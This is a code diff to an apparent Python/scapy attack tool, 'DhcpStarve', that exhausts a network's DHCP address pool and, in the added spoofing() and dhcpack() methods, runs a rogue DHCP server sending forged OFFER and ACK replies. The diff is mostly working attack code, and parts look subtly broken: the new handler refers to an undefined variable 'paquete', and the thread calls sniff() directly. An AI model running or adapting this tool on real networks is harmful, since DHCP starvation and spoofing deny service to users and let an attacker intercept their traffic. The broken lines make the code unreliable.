@@ -22,6 +22,7 @@ class DhcpStarve:
               stop_filter=self.should_stop_sniffer)
         
     def should_stop_sniffer(self, packet):
+        '''Sets Event to stop scapy sniff method'''
         return self.stop_sniffer.isSet()  #to stop scapy sniff in method listen()
     
     def handle_dhcp(self, pkt):
@@ -38,7 +39,7 @@ class DhcpStarve:
                 print("DHCP OFFER:: \n{}".format(pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==3:               #3 is DHCPREQUEST
                 print("DHCP REQUEST: \n{}".format(pkt[DHCP].options))
-            elif pkt[DHCP].options[0][1]==1:               #3 is DHCPDISCOVER
+            elif pkt[DHCP].options[0][1]==1:               #1 is DHCPDISCOVER
                 print("DHCP DISCOVER: \n{}".format(pkt[DHCP].options))
             else:
                 print ("DHCP with options: {}".format(pkt[DHCP].options))
@@ -87,7 +88,23 @@ class DhcpStarve:
         print('Succesfully starved IPs: {}'.format(self.starvedIPs))
         
     def spoofing(self):
-        pass
+        '''Starts DHCP server'''
+        def handle_dhcp(pkt):
+            if pkt[DHCP].options[0][1]==1: #if DHCP DISCOVER
+                print("Received DISCOVER, Sending OFFER")
+                self.offer(pkt[Ether].src,LOCALIP,'172.18.100.100','255.255.255.0')
+            elif paquete[DHCP].options[0][1]== 3: #if DHCP REQUEST
+                print("Received REQUEST, Sending ACK")
+                self.dhcpack(pkt[Ether].src,LOCALIP,'172.18.100.100','255.255.255.0')
+                
+        listenProcess = Thread(target=sniff(
+              filter="udp and (port 67 or port 68)",
+              prn=handle_dhcp,
+              store=0,
+              stop_filter=self.should_stop_sniffer))
+        
+        listenProcess.start()
+        
     def offer(self,dstMAC,srcIP,client_ip,mask):
         '''Generate DHCP offer packet'''
         dhcpOffer = Ether(src=LOCALMAC, dst=dstMAC)
@@ -102,7 +119,24 @@ class DhcpStarve:
                                          ("subnet_mask", mask),
                                          ("server_id", srcIP),
                                          "end"])
-                                                               
+        dhcpResp = sendp(dhcpOffer,iface=LOCALIFACE)
+        
+    def dhcpack(self,dstMAC,srcIP,client_ip,mask):
+        '''Generate DHCP request packet'''
+        dhcpack = Ether(src=LOCALMAC, dst=dstMAC)
+        dhcpack/= IP(src=srcIP, dst='255.255.255.255')
+        dhcpack/= UDP(dport=68, sport=67)
+        dhcpack/= BOOTP(chaddr=LOCALMACRAW,
+                          xid=RandInt(),
+                          yiaddr=client_ip,
+                          siaddr=srcIP, 
+                          giaddr=srcIP) 
+        dhcpack /= DHCP(options=[("message-type", "ack"),
+                                         ("subnet_mask", mask),
+                                         ("server_id", srcIP),
+                                         "end"])
+        dhcpResp = sendp(dhcpack,iface=LOCALIFACE)
+        
     @_sniff_wrapper                            
     def sniffing(self):
         '''Just snffing with _sniff_wrapper method '''
@@ -235,7 +269,7 @@ class Menu:
 
 
 def get_network_def():
-    """Read the default gateway directly from /proc, returns dict {'defGW':.., 'dev':.., 'GWmac':.., 'mac':..}"""
+    """Read the default gateway directly from /proc, returns dict {'defGW':.., 'dev':.., 'GWmac':.., 'mac':.., 'ip':..}"""
     subprocess.run(['ping','-c','1','4.2.2.2'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)  #to get some ARP entry for default gateway
     output={}
     #Default gateway ip
@@ -268,14 +302,24 @@ def get_network_def():
     except Exception as e:
         print('Error while checking mac address in /sys/class/net/{}/address'.format(output.get('dev')))
         print(e.message, e.args)
-
+              
+    #Interface IP   
+    ipcmd = subprocess.run(['ifconfig','wlan0'],stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.decode().split('\n')
+    try:
+        ip= ''.join([line.split()[1] for line in ipcmd if 'broadcast' in line])
+        output.update({'ip': ip})
+    except Exception as e:
+        print('Error while checking IP in ifconfig')
+        print(e.message, e.args)
 
     return output
 
 
 # configuration
-LOCALIFACE = get_network_def().get('dev')
-REQUESTMAC = get_network_def().get('mac')
+network_data=get_network_def()
+LOCALIFACE = network_data.get('dev')
+REQUESTMAC = network_data.get('mac')
+LOCALIP = network_data.get('ip')
 MYHOSTNAME='host'
 LOCALMAC = get_if_hwaddr(LOCALIFACE)
 LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(':',''))
